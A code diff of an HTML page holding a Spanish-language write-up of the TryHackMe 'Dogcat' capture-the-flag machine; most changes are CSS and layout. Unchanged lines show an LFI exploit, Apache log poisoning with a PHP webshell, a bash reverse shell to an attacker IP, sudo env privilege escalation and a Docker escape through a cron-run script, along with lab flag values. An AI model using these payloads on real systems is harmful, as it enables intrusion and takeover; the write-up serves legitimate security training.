@@ -31,7 +31,6 @@
     overflow-x: hidden;
   }
 
-  /* Grid background */
   body::before {
     content: '';
     position: fixed;
@@ -52,7 +51,6 @@
     z-index: 1;
   }
 
-  /* Header */
   .hero {
     padding: 60px 0 48px;
     border-bottom: 1px solid var(--border);
@@ -108,7 +106,6 @@
     opacity: 0.5;
   }
 
-  /* Kill chain visual */
   .killchain {
     background: var(--surface);
     border: 1px solid var(--border);
@@ -146,12 +143,8 @@
     white-space: nowrap;
   }
 
-  .chain-arrow {
-    color: var(--text-muted);
-    font-size: 16px;
-  }
+  .chain-arrow { color: var(--text-muted); font-size: 16px; }
 
-  /* Sections */
   .section {
     margin-bottom: 52px;
     animation: fadeUp 0.5s ease both;
@@ -190,7 +183,6 @@
 
   p { margin-bottom: 14px; color: var(--text); font-size: 0.97rem; }
 
-  /* Code blocks */
   .code-block {
     background: #080d16;
     border: 1px solid var(--border);
@@ -236,7 +228,6 @@
   .warn { color: #fbbf24; }
   .err { color: var(--accent2); }
 
-  /* Inline code */
   code {
     font-family: var(--mono);
     font-size: 0.88em;
@@ -247,7 +238,6 @@
     color: var(--accent);
   }
 
-  /* Tables */
   .table-wrap { overflow-x: auto; margin: 16px 0; }
 
   table {
@@ -284,7 +274,6 @@
     word-break: break-all;
   }
 
-  /* Alert boxes */
   .alert {
     padding: 16px 20px;
     border-radius: 4px;
@@ -295,32 +284,12 @@
     align-items: flex-start;
   }
 
-  .alert-warn {
-    background: rgba(251,191,36,0.07);
-    border: 1px solid rgba(251,191,36,0.25);
-    color: #fcd34d;
-  }
-
-  .alert-info {
-    background: rgba(78,158,255,0.07);
-    border: 1px solid rgba(78,158,255,0.25);
-    color: #93c5fd;
-  }
-
-  .alert-success {
-    background: rgba(0,255,157,0.06);
-    border: 1px solid rgba(0,255,157,0.2);
-    color: var(--accent);
-  }
-
+  .alert-warn { background: rgba(251,191,36,0.07); border: 1px solid rgba(251,191,36,0.25); color: #fcd34d; }
+  .alert-info { background: rgba(78,158,255,0.07); border: 1px solid rgba(78,158,255,0.25); color: #93c5fd; }
+  .alert-success { background: rgba(0,255,157,0.06); border: 1px solid rgba(0,255,157,0.2); color: var(--accent); }
   .alert-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: 1px; }
 
-  /* Flags section */
-  .flags-grid {
-    display: grid;
-    gap: 14px;
-    margin-top: 16px;
-  }
+  .flags-grid { display: grid; gap: 14px; margin-top: 16px; }
 
   .flag-card {
     background: var(--surface);
@@ -336,10 +305,7 @@
     transition: border-color 0.2s, background 0.2s;
   }
 
-  .flag-card:hover {
-    background: var(--surface2);
-    border-left-color: #00ffbb;
-  }
+  .flag-card:hover { background: var(--surface2); border-left-color: #00ffbb; }
 
   .flag-label {
     font-family: var(--mono);
@@ -377,11 +343,9 @@
     flex-shrink: 0;
   }
 
-  /* Vulns table */
   td.sev-critical { color: var(--accent2); font-weight: 700; }
   td.sev-high     { color: #fb923c; font-weight: 600; }
 
-  /* Footer */
   footer {
     border-top: 1px solid var(--border);
     padding-top: 28px;
@@ -397,7 +361,6 @@
 
   footer span { color: var(--accent); }
 
-  /* Animations */
   @keyframes fadeDown {
     from { opacity: 0; transform: translateY(-20px); }
     to   { opacity: 1; transform: translateY(0); }
@@ -414,7 +377,6 @@
   .section:nth-child(5) { animation-delay: 0.2s; }
   .section:nth-child(6) { animation-delay: 0.25s; }
 
-  /* Scrollbar */
   ::-webkit-scrollbar { width: 6px; height: 6px; }
   ::-webkit-scrollbar-track { background: var(--bg); }
   ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
@@ -424,6 +386,11 @@
 <body>
 <div class="wrapper">
 
+  <!-- BOTÓN VOLVER AL ÍNDICE -->
+  <a href="index.html" style="display:inline-flex;align-items:center;gap:8px;font-family:var(--mono);font-size:12px;color:var(--text-muted);text-decoration:none;margin-bottom:24px;padding:8px 16px;border:1px solid var(--border);border-radius:4px;">
+    ← Volver al índice
+  </a>
+
   <!-- HERO -->
   <header class="hero">
     <div class="badge-row">
@@ -432,7 +399,11 @@
       <span class="badge badge-linux">Linux</span>
       <span class="badge badge-docker">Docker</span>
     </div>
-    <h1>🐶🐱 Dog<span class="accent">cat</span></h1>
+    <h1>
+      <img src="img/dogcat.png" alt="Dogcat" style="height:1.2em; vertical-align:middle; margin-right:8px;" />
+      Dog<span class="accent">cat</span>
+    </h1>
+    <img src="img/dogcat.png" alt="Dogcat Banner" style="width:100%; max-width:600px; border-radius:8px; margin:20px 0; border:1px solid var(--border);" />
     <div class="hero-meta">
       <span>IP Objetivo: 10.66.129.37</span>
       <span>IP Atacante: 192.168.209.92</span>
@@ -465,25 +436,20 @@
   <!-- RECONOCIMIENTO -->
   <div class="section">
     <h2><span class="num">01</span> Reconocimiento</h2>
-
     <h3>// Nmap</h3>
     <div class="code-block">
       <div class="code-header">bash — nmap scan</div>
       <pre><span class="cmd">nmap</span> -sC -sV -T4 -oN nmap_dogcat.txt 10.66.129.37</pre>
     </div>
-
     <div class="table-wrap">
       <table>
-        <thead>
-          <tr><th>Puerto</th><th>Estado</th><th>Servicio</th><th>Versión</th></tr>
-        </thead>
+        <thead><tr><th>Puerto</th><th>Estado</th><th>Servicio</th><th>Versión</th></tr></thead>
         <tbody>
           <tr><td>22/tcp</td><td>open</td><td>SSH</td><td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td></tr>
           <tr><td>80/tcp</td><td>open</td><td>HTTP</td><td>Apache 2.4.38 (Debian) — PHP/7.4.3</td></tr>
         </tbody>
       </table>
     </div>
-
     <div class="alert alert-info">
       <span class="alert-icon">💡</span>
       <div>La web expone el parámetro <code>?view=dog</code> / <code>?view=cat</code> — vector LFI identificado desde el primer curl al HTML.</div>
@@ -493,7 +459,6 @@
   <!-- ENUMERACIÓN -->
   <div class="section">
     <h2><span class="num">02</span> Enumeración Web</h2>
-
     <h3>// Gobuster</h3>
     <div class="code-block">
       <div class="code-header">bash — gobuster dir</div>
@@ -501,12 +466,9 @@
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
   -x php,txt,html -t 40</pre>
     </div>
-
     <div class="table-wrap">
       <table>
-        <thead>
-          <tr><th>Recurso</th><th>Status</th><th>Tamaño</th><th>Nota</th></tr>
-        </thead>
+        <thead><tr><th>Recurso</th><th>Status</th><th>Tamaño</th><th>Nota</th></tr></thead>
         <tbody>
           <tr><td>index.php</td><td>200</td><td>418</td><td>—</td></tr>
           <tr><td>cat.php / dog.php</td><td>200</td><td>26</td><td>—</td></tr>
@@ -520,44 +482,35 @@
   <!-- LFI -->
   <div class="section">
     <h2><span class="num">03</span> Explotación — LFI</h2>
-
     <h3>// Descubrimiento del LFI</h3>
     <p>El primer intento revela el comportamiento exacto del servidor a través de sus mensajes de error:</p>
-
     <div class="code-block">
       <div class="code-header">bash — test LFI básico</div>
       <pre><span class="cmd">curl</span> -s <span class="string">"http://10.66.129.37/?view=dog/../../../etc/passwd"</span></pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">respuesta — error revelador</div>
       <pre><span class="err">Warning</span>: include(dog/../../../etc/passwd<span class="warn">.php</span>): failed to open stream
 <span class="comment"># Ruta absoluta revelada:</span>
 in <span class="warn">/var/www/html/index.php</span> on line 24</pre>
     </div>
-
     <div class="alert alert-warn">
       <span class="alert-icon">⚠️</span>
       <div>El servidor concatena <code>.php</code> automáticamente. También nos revela la ruta absoluta: <code>/var/www/html/</code></div>
     </div>
-
     <h3>// Bypass — parámetro ext vacío</h3>
     <p>El parámetro <code>ext</code> controla la extensión añadida. Pasando <code>&ext=</code> vacío eliminamos el <code>.php</code>:</p>
-
     <div class="code-block">
       <div class="code-header">bash — bypass ext + lectura /etc/passwd</div>
       <pre><span class="cmd">curl</span> -s <span class="string">"http://10.66.129.37/?view=dog/../../../../etc/passwd&amp;ext="</span>
 <span class="comment"># Output: root:x:0:0:root:/root:/bin/bash ...</span></pre>
     </div>
-
     <h3>// Lectura del código fuente con php://filter</h3>
-
     <div class="code-block">
       <div class="code-header">bash — leer index.php en base64</div>
       <pre><span class="cmd">curl</span> -s <span class="string">"http://10.66.129.37/?view=php://filter/convert.base64-encode/resource=dog/../index.php&amp;ext="</span> \
   | <span class="cmd">grep</span> -oP <span class="string">'go!\K[^&lt;]+'</span> | <span class="cmd">tr</span> -d <span class="string">'\n '</span> | <span class="cmd">base64</span> -d</pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">php — código fuente de index.php</div>
       <pre><span class="comment">// Filtro de seguridad (bypasseable):</span>
@@ -567,15 +520,12 @@ if(containsStr($_GET[<span class="string">'view'</span>], <span class="string">'
     include $_GET[<span class="string">'view'</span>] . <span class="warn">$ext</span>;  <span class="comment">// ← LFI directo</span>
 }</pre>
     </div>
-
     <h3>// Flag 1 — Lectura de flag.php</h3>
-
     <div class="code-block">
       <div class="code-header">bash — extraer flag 1</div>
       <pre><span class="cmd">curl</span> -s <span class="string">"http://10.66.129.37/?view=php://filter/convert.base64-encode/resource=dog/../flag.php&amp;ext="</span> \
   | <span class="cmd">grep</span> -oP <span class="string">'go!\K[^&lt;]+'</span> | <span class="cmd">tr</span> -d <span class="string">'\n '</span> | <span class="cmd">base64</span> -d</pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">output — flag.php</div>
       <pre>&lt;?php
@@ -587,12 +537,10 @@ $flag_1 = <span class="flag-val">"THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"</span>
   <!-- RCE -->
   <div class="section">
     <h2><span class="num">04</span> Acceso Inicial — RCE via Log Poisoning</h2>
-
     <div class="alert alert-warn">
       <span class="alert-icon">⚠️</span>
       <div>El log de Apache debe estar limpio. Si Gobuster lo inundó previamente, PHP agotará memoria al incluirlo. Reiniciar la máquina antes de este paso.</div>
     </div>
-
     <h3>// Paso 1 — Inyectar webshell en User-Agent</h3>
     <div class="code-block">
       <div class="code-header">bash — envenenar access.log</div>
@@ -600,18 +548,15 @@ $flag_1 = <span class="flag-val">"THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"</span>
   -H <span class="string">"User-Agent: &lt;?php system(\$_GET['cmd']); ?&gt;"</span>
 <span class="comment"># El payload PHP queda registrado en access.log</span></pre>
     </div>
-
     <h3>// Paso 2 — Verificar RCE</h3>
     <div class="code-block">
       <div class="code-header">bash — ejecutar id via LFI</div>
       <pre><span class="cmd">curl</span> -s <span class="string">"http://10.66.129.37/?view=dog/../../../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=id"</span></pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">output — RCE confirmado</div>
       <pre><span class="flag-val">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
     </div>
-
     <h3>// Paso 3 — Reverse Shell</h3>
     <div class="code-block">
       <div class="code-header">bash — listener + payload</div>
@@ -621,12 +566,10 @@ $flag_1 = <span class="flag-val">"THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"</span>
 <span class="comment"># Terminal 2 — reverse shell</span>
 <span class="cmd">curl</span> -s <span class="string">"http://10.66.129.37/?view=dog/../../../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.209.92/4444%200>%261'"</span></pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">shell obtenida</div>
       <pre><span class="flag-val">www-data@17745b9ca4e5:/var/www/html$</span></pre>
     </div>
-
     <h3>// Flag 2</h3>
     <div class="code-block">
       <div class="code-header">bash — encontrar y leer flag 2</div>
@@ -639,7 +582,6 @@ $flag_1 = <span class="flag-val">"THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"</span>
   <!-- PRIVESC -->
   <div class="section">
     <h2><span class="num">05</span> Post-Explotación — PrivEsc a Root</h2>
-
     <h3>// Enumeración sudo</h3>
     <div class="code-block">
       <div class="code-header">bash — sudo -l</div>
@@ -649,12 +591,10 @@ $flag_1 = <span class="flag-val">"THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"</span>
 User www-data may run the following commands on 17745b9ca4e5:
     (root) NOPASSWD: <span class="warn">/usr/bin/env</span></pre>
     </div>
-
     <div class="alert alert-warn">
       <span class="alert-icon">💥</span>
       <div><code>/usr/bin/env</code> con <code>NOPASSWD</code> es un vector clásico de GTFOBins. Permite ejecutar cualquier binario arbitrario con privilegios de root.</div>
     </div>
-
     <h3>// Escalada via GTFOBins</h3>
     <div class="code-block">
       <div class="code-header">bash — escalar a root</div>
@@ -663,7 +603,6 @@ User www-data may run the following commands on 17745b9ca4e5:
 <span class="flag-val">root@17745b9ca4e5:/var/www/html# id</span>
 uid=0(root) gid=0(root) groups=0(root)</pre>
     </div>
-
     <h3>// Flag 3</h3>
     <div class="code-block">
       <div class="code-header">bash</div>
@@ -675,26 +614,22 @@ uid=0(root) gid=0(root) groups=0(root)</pre>
   <!-- DOCKER ESCAPE -->
   <div class="section">
     <h2><span class="num">06</span> Docker Escape</h2>
-
     <h3>// Confirmación del entorno</h3>
     <div class="code-block">
       <div class="code-header">bash — detectar docker</div>
       <pre><span class="cmd">cat</span> /.dockerenv        <span class="comment"># existe → estamos en Docker</span>
 <span class="cmd">hostname</span>               <span class="comment"># 17745b9ca4e5 → hash de contenedor</span></pre>
     </div>
-
     <h3>// Identificación del vector</h3>
     <div class="code-block">
       <div class="code-header">bash — ver montajes</div>
       <pre><span class="cmd">mount</span> | <span class="cmd">grep</span> -v tmpfs</pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">output — hallazgo crítico</div>
       <pre><span class="flag-val">/dev/nvme1n1p2 on /opt/backups type ext4 (rw,relatime,data=ordered)</span>
 <span class="comment">↑ Disco del HOST montado con permisos RW dentro del contenedor</span></pre>
     </div>
-
     <h3>// Análisis de backup.sh</h3>
     <div class="code-block">
       <div class="code-header">bash — contenido del script</div>
@@ -704,7 +639,6 @@ uid=0(root) gid=0(root) groups=0(root)</pre>
 <span class="cmd">tar</span> cf /root/container/backup/backup.tar /root/container
 <span class="comment"># El host ejecuta este script cada minuto via cron como root</span></pre>
     </div>
-
     <h3>// Inyección de reverse shell</h3>
     <div class="code-block">
       <div class="code-header">bash — envenenar backup.sh</div>
@@ -713,7 +647,6 @@ uid=0(root) gid=0(root) groups=0(root)</pre>
 <span class="comment"># Verificar:</span>
 <span class="cmd">cat</span> /opt/backups/backup.sh</pre>
     </div>
-
     <div class="code-block">
       <div class="code-header">bash — listener en el host</div>
       <pre><span class="cmd">nc</span> -lvnp 5555
@@ -723,12 +656,10 @@ connect to [192.168.209.92] from (UNKNOWN) [10.66.129.37] 36070
 <span class="flag-val">root@dogcat:~#</span>
 uid=0(root) gid=0(root) groups=0(root)</pre>
     </div>
-
     <div class="alert alert-success">
       <span class="alert-icon">🎉</span>
       <div>Shell root obtenida en el sistema <strong>host real</strong>, fuera del contenedor Docker.</div>
     </div>
-
     <h3>// Flag 4</h3>
     <div class="code-block">
       <div class="code-header">bash</div>
@@ -781,9 +712,7 @@ uid=0(root) gid=0(root) groups=0(root)</pre>
     <h2><span class="num">08</span> Vulnerabilidades &amp; Mitigaciones</h2>
     <div class="table-wrap">
       <table>
-        <thead>
-          <tr><th>Vulnerabilidad</th><th>Severidad</th><th>Mitigación</th></tr>
-        </thead>
+        <thead><tr><th>Vulnerabilidad</th><th>Severidad</th><th>Mitigación</th></tr></thead>
         <tbody>
           <tr>
             <td>LFI en parámetro <code>view</code></td>
